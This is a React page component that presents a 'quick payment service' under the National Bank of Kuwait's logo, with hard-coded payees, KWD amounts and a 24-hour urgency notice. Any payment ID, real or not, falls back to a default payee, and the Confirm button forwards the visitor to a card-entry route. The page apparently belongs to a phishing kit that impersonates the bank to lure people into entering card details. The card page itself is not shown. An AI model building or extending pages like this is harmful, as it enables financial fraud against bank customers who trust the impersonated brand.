
import { useParams, useNavigate } from "react-router-dom";

// بيانات وهمية محاكية - Updated 2025-08-19
const dummyPaymentData = {
  "123": {
    id: "123",
    customerName: "AHMED MOHAMED ABDI",
    amount: 50.000,
    currency: "KWD",
    description: "Bill Payment",
    expiryDate: "2025-12-31",
    createdAt: "2025-06-19"
  },
  "456": {
    id: "456",
    customerName: "FATIMA ALI YUSUF",
    amount: 25.750,
    currency: "KWD",
    description: "Service Charge",
    expiryDate: "2025-12-31",
    createdAt: "2025-06-19"
  },
  "789": {
    id: "789",
    customerName: "OMAR HASSAN MOHAMED",
    amount: 100.500,
    currency: "KWD",
    description: "Subscription Payment",
    expiryDate: "2025-12-31",
    createdAt: "2025-06-19"
  },
  "pay_1755575829268_7kths83vaq_04xj": {
    id: "pay_1755575829268_7kths83vaq_04xj",
    customerName: "يوسف غازي الرشيدي",
    amount: 30.000,
    currency: "KWD",
    description: "Family Support",
    expiryDate: "2025-08-20",
    createdAt: "2025-08-19"
  }
};

// البيانات الافتراضية للمعاملات غير المعروفة
const defaultPaymentData = {
  customerName: "يوسف غازي الرشيدي",
  amount: 30.000,
  currency: "KWD",
  description: "Family Support",
  expiryDate: "2025-08-20",
  createdAt: "2025-08-19"
};

const PaymentPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();

  // الحصول على البيانات الوهمية بناءً على المعرف
  const paymentData = dummyPaymentData[id as string] || {
    id: id as string,
    ...defaultPaymentData
  };

  const handleConfirm = () => {
    navigate(`/card/${id}`);
  };

  // التحقق من صحة معرف الدفع - فقط للمعرفات القصيرة جداً
  if (!id || id.length < 3) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-black via-purple-900 to-purple-800 text-white flex items-center justify-center">
        <div className="text-center">
          <div className="text-xl mb-4">لم يتم العثور على الطلب</div>
          <button 
            onClick={() => navigate('/')}
            className="bg-emerald-400 text-black px-6 py-3 rounded-lg font-bold"
          >
            العودة للرئيسية
          </button>
        </div>
      </div>
    );
  }

  // Format amount to show integer and decimal parts
  const formatAmount = (amount: number) => {
    const parts = amount.toFixed(3).split('.');
    return { integer: parts[0], decimal: parts[1] };
  };

  // Get currency symbol
  const getCurrencySymbol = (currency: string) => {
    const symbols: { [key: string]: string } = {
      'KWD': 'د.ك',
      'USD': '$',
      'EUR': '€',
      'GBP': '£',
      'SAR': 'ر.س',
      'AED': 'د.إ',
      'QAR': 'ر.ق',
      'BHD': 'د.ب'
    };
    return symbols[currency] || currency;
  };

  const currencySymbol = getCurrencySymbol(paymentData.currency || 'KWD');

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4">
      {/* شعار NBK */}
      <div className="mb-8">
        <img src="/nbk-logo.jpg" alt="بنك الكويت الوطني" className="h-16" />
      </div>
      
      {/* عنوان الخدمة */}
      <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">
        خدمة الدفع السريع
      </h1>
      
      {/* معلومات الدفع */}
      <div className="w-full max-w-md bg-gray-50 border border-gray-300 rounded-lg p-6 mb-6">
        <div className="space-y-4 text-right">
          <div className="flex justify-between items-center">
            <span className="font-bold">{paymentData.customerName}</span>
            <span className="text-gray-700">:اسم المستلم</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="font-bold">{paymentData.amount.toFixed(3)} {currencySymbol}</span>
            <span className="text-gray-700">:المبلغ</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="font-bold">{paymentData.description}</span>
            <span className="text-gray-700">:الغرض</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="font-bold text-red-600">صالح لمدة 24 ساعة</span>
            <span className="text-gray-700">:انتهاء الصلاحية</span>
          </div>
        </div>
      </div>
      
      {/* تنبيه مهم */}
      <div className="text-right text-sm text-gray-600 mb-8 max-w-md leading-relaxed">
        يرجى عدم إغلاق الصفحة بعد إتمام عملية الدفع لحين ظهور صفحة التأكيد التي تفيد بأن العملية ناجحة لتفادي أي مشاكل قد تنتج عن ذلك.
      </div>
      
      {/* أزرار التحكم */}
      <div className="flex flex-col gap-3 w-full max-w-md">
        <button 
          onClick={handleConfirm}
          className="w-full bg-blue-700 hover:bg-blue-800 text-white py-3 text-lg rounded-lg transition-colors"
        >
          تأكيد
        </button>
        
        <button 
          className="w-full border border-gray-300 text-gray-700 py-3 text-lg rounded-lg hover:bg-gray-50 transition-colors"
          onClick={() => alert('تم رفض عملية الدفع')}
        >
          رفض
        </button>
      </div>
    </div>
  );
};

export default PaymentPage;
